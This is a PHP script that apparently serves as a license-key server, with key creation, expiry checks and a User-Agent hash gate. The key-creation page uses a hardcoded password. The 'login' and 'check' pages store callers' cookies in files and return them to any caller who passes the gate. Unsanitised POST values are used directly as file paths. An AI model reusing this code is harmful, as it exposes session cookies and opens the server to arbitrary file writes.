<?php
    function encrypt($data) {
      $hexData = bin2hex($data);
      $md5Data1 = md5($hexData);
      $md5Data2 = md5($md5Data1);
      return $md5Data2;
    }
    date_default_timezone_set('Asia/Shanghai');
    if ("User-Agent:User-Agent:User-Agent".encrypt($_POST["ip"])==$_SERVER['HTTP_USER_AGENT']) {
      if ($_GET["page"]=="akm") {
        if ($_POST["create"]=="true" & $_POST["pw"]=="2846579m") {
          $carmi=$_POST["ck"];
          $time=$_POST["tm"];
          $time=strtotime($time);
          file_put_contents("user/".$carmi,"");
          file_put_contents("time/".$carmi.".time",$time);
          echo "创建成功\n卡密:".$carmi;
        } else {
          $carmi=$_POST["km"];//?km=xxx,km=xxx
          if (file_exists("user/".$carmi)) {
            $user=$_POST["ip"];
            if ($carmiq=file_get_contents("user/".$carmi)) {
              if ($user==$carmiq) {
                $time=file_get_contents("time/".$carmi.".time");
                if (time() <= $time) {
                  echo encrypt($carmi.'01');
                } else {
                  echo encrypt($carmi.'02');
                  unlink("user/".$carmi);
                  unlink("time/".$carmi.".time");
                }
              } else {
                echo encrypt($carmi.'03');
              }
            } else {
              $file = fopen("user/".$carmi,"w");
              fwrite($file,$user);
              fclose($file);
              echo encrypt($carmi.'01');
            }
          } else {
            echo encrypt($carmi.'00');
          }
        }
      }
      if ($_GET["page"] == "check") {
        $check = file_get_contents("uesr-cookie/".$_POST["user"].".log");
        echo $check;
      }
      if ($_GET["page"] == "login") {
        $cookie = $_SERVER['HTTP_COOKIE'];
        $file = fopen("uesr-cookie/".$_POST["user"].".log","w");
        fwrite($file,$cookie);
        fclose($file);
      }
    } else {
      header("HTTP/1.1 403 Forbidden");
      exit();
    }
?>
